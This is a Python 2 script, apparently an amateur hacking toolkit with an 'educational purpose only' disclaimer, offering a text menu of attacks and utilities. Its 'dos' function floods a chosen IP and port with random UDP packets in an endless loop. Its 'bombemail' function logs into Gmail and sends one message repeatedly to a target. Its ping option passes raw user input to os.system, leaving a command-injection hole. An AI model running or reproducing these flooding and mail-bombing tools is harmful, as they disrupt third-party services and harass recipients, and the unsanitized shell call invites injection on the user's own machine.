import os
import sys
import random
import webbrowser
import socket
import time

import getpass
import urllib
import smtplib

from sys import platform

"""
Educational purpose only
=====================================
I'm not responsible for your actions

Created By: TheTechHacker
=============================
SUBSCRIBE: https://www.youtube.com/channel/UCKAmv8p_TRvUNrJlfiB8qBQ

"""
if platform == "linux" or platform == "linux2":
    os.system("clear")
elif platform == "darwin":
    os.system("clear")
    print "OS X"
    print "This Tool Works Best In Kali Linux"
elif platform == "win32":
    os.system("cls")
    print "\033[1;34m [-]Windows System Detected \033[1;m"
    print "\033[1;34m [-]This Tool is for Linux \033[1;m"
    windows = raw_input("Do You Want To Continue y/n :")

    if windows == "Y":
        os.system("cls")
    elif windows == "N":
        exit("This Tool Works Best on Kali Linux")
    elif windows == "y":
        os.system("cls")
    elif windows == "n":
        exit("This Tool Works Best on Kali Linux")
    else:
        exit("Error")
else:
    print "\033[1;34mError \033[1;m"
    exit("\033[1;34mUnknown System Detected \033[1;m")

try:
    print "\033[1;34mStarting up \033[1;m"
    time.sleep(1)
    print "\033[1;34mGet Ready \033[1;m"
    time.sleep(1)
    print "\033[1;34m Lunching \033[1;m"
    time.sleep(1)
    if platform == "linux" or platform == "linux2":
        os.system("clear")
    elif platform == "darwin":
        os.system("clear")
        print "This Tool Works Best on Kali linux"
    elif platform == "win32":
        os.system("cls")
    else:
        print "Unknown System Detected"
except KeyboardInterrupt:
    print " "
    exit("\033[1;34m [-]Canceled By User \033[1;m")


print "\033[1;32m"

def dos():

    soc = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)


    try:
        at = input("byte: ")
        attack = random._urandom(at)
        ip = raw_input("IP: ")
        port = input("port: ")
    except KeyboardInterrupt:
        exit("Error")
    except UnboundLocalError:
        exit("Error")
    while True:
        try:
            soc.sendto(attack, (ip, port))
            print "\033[1;34m Sending Bytes \033[1;m"
        except KeyboardInterrupt:
            exit("\033[1;34m Canceled By User \033[1;m")
        except UnboundLocalError:
            exit("Error")


def browser():
    try:
        search = raw_input("Search: ")
        webbrowser.open(search)
        exit("")
    except KeyboardInterrupt:
        exit("\033[1;34 [-]Canceled By User \033[1;m")


def youtube():
    webbrowser.open("https://www.youtube.com/channel/UCKAmv8p_TRvUNrJlfiB8qBQ")
    exit("")


def ping():
    if platform == "linux" or platform == "linux2":
        os.system("clear")
    elif platform == "darwin":
        os.system("clear")
        print "This Tool Works Best on Kali linux"
    elif platform == "win32":
        os.system("cls")
    else:
        print "Unknown System Detected"

    traget = raw_input("site: ")
    os.system("ping " + traget)
    exit(" ")


def bombemail():
    if platform == "linux" or platform == "linux2":
        os.system("clear")
    elif platform == "darwin":
        os.system("clear")
    elif platform == "win32":
        os.system("cls")
    else:
        print "\033[1;34m Unknown System Detected \033[1;m"

    print"""
    \033[1;32m
          '||'''|,                    '||     
           ||   ||                     ||     
           ||;;;;   .|''|, '||),,(|,   ||''|, 
           ||   ||  ||  ||  || || ||   ||  || 
          .||...|'  `|..|' .||    ||. .||..|' 
          \033[1;m                          
    """

    try:
        print "\033[1;32m"
        gmail = raw_input("Email: ")
        passwd = getpass.getpass("Password: ")
        msg = raw_input("Message: ")
        to = raw_input("To: ")

        send = input("Number: ")
        print "\033[1;m"
    except KeyboardInterrupt:
        exit("\033[1;34m [-]Canceled By User \033[1;m")
    except EOFError:
        exit("\033[1;34m ERROR \033[1;m")

    try:
        print "\033[1;32m"
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(gmail, passwd)
        for i in range(0, +send):
            server.sendmail(gmail, to, msg)
            print (i)
        print "\033[1;m"
    except KeyboardInterrupt:
        exit("\033[1;34m [-]Canceled By User \033[1;m")


def urlcode():
    if platform == "linux" or platform == "linux2":
        os.system("clear")
    elif platform == "darwin":
        os.system("clear")
        print "This Tool Works Best on Kali linux"
    elif platform == "win32":
        os.system("cls")
    else:
        print "Unknown System Detected"

    print """
    \033[1;32m
                  .|'''|         ||               .|'''',            ||`        
              ||       ''    ||               ||                 ||         
           `   |'''|,  ||  ''||''  .|''|, --- ||      .|''|, .|''||  .|''|, 
               .   ||  ||    ||    ||..||     ||      ||  || ||  ||  ||..|| 
               |...|' .||.   `|..' `|...      `|....' `|..|' `|..||. `|...     
               
               \033[1;m
    """
    try:
        print "\033[1;32m"
        url = raw_input("           Url:   ")
        print "\033[1;m"
        print "\033[1;32m"
        code = urllib.urlopen(url)
        print (code.code)
        if code.code == 200:
            print("\033[1;32m site is up \033[1;32m")
        else:
            print("\033[1;32m sit is down \033[1;m")
        print "\033[1;m"
    except EOFError:
        exit("\033[1;34m ERROR \033[1;m")
    except IOError:
        exit("\033[1;34m ERROR \033[1;m")
    except KeyboardInterrupt:
        exit("\033[1;34m [-]Canceled By User \033[1;m")
    exit(" ")


def menu():
    print """
          ==============================
            Created By: TheTechHacker
          ==============================
          
          bombemail - email bomber
          dos - perform a DoS/DDoS on IP
          search - search in web browser 
          upordown - Check Website is Up Or down
          ping - ping a website
          subscribe - Subscribe to my YouTube Channel
          
          
          """
    exit("")


print "\033[1;m"

print """
\033[1;32m 
         '  ||\   /||`          ||            '||  //'         ||    
           ||\ \.//||           ||             || //     ''    ||    
            ||     ||  .|''|, ''||''   '''|.   ||<<      ||  ''||''  
            ||     ||  ||..||   ||    .|''||   || \ \    ||    ||    
.           ||     ||. `|...    `|..' `|..||. .||  \ \. .||.   `|..' 
                                                         
      \033[1;m
      """

try:
    print "\033[1;32m"
    user = raw_input("      Input: ")

    if user == "dos":
        print (dos())
    elif user == "search":
        print (browser())
    elif user == "subscribe":
        print (youtube())
    elif user == "ping":
        print (ping())
    elif user == "upordown":
        print (urlcode())
    elif user == "bombemail":
        print (bombemail())
    elif user == "show options":
        print (menu())
    else:
        exit("\033[1;34m Error \033[1;m")
    print "\033[1;m"
except KeyboardInterrupt:
    print " "
    exit("\033[1;34m [-]Canceled By User \033[1;m")
except EOFError:
    exit("\033[1;34m ERROR \033[1;m")